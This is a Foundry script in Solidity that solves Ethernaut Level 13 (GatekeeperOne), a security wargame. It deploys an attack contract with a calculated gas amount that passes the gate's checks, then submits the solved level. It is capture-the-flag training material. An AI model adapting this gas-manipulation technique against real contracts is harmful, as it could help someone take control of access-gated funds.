// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { GatekeeperOne } from "src/Level13.sol";
import { L13Attack } from "src/Level13Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        GatekeeperOne instance = GatekeeperOne(instanceAddress);

        L13Attack attack = new L13Attack(instance);
        uint256 res = attack.attack(3 * 8191 + 256); // pass zero to find the gas amount needed
        console2.log(res);
        (,, address txOrigin) = vm.readCallers();
        require(instance.entrant() == txOrigin, "Level not solved");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
